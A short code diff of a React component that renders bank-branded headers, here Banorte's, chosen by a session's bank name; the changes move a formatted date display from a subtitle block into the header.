@@ -144,6 +144,7 @@ export default function ClientScreen() {
     } else if (sessionData.banco === 'BANORTE') {
       return (
         <header className="bg-[#EC1C24] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={banorteLogoHeader} 
             className="h-20 inline-block" 
@@ -152,8 +153,10 @@ export default function ClientScreen() {
         </header>
       );
     } else {
+      // Default header (Banorte)
       return (
         <header className="bg-[#EC1C24] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={banorteLogoHeader} 
             className="h-20 inline-block" 
@@ -251,7 +254,6 @@ export default function ClientScreen() {
     } else if (sessionData.banco === 'BANORTE') {
       return (
         <div className="text-center mt-2 px-4">
-          <p className="text-sm text-gray-600 fecha-banorte">{formatDate(new Date())}</p>
           <p className="text-sm text-gray-600 mt-1">Tu banca en línea, más segura y con mayor protección</p>
         </div>
       );
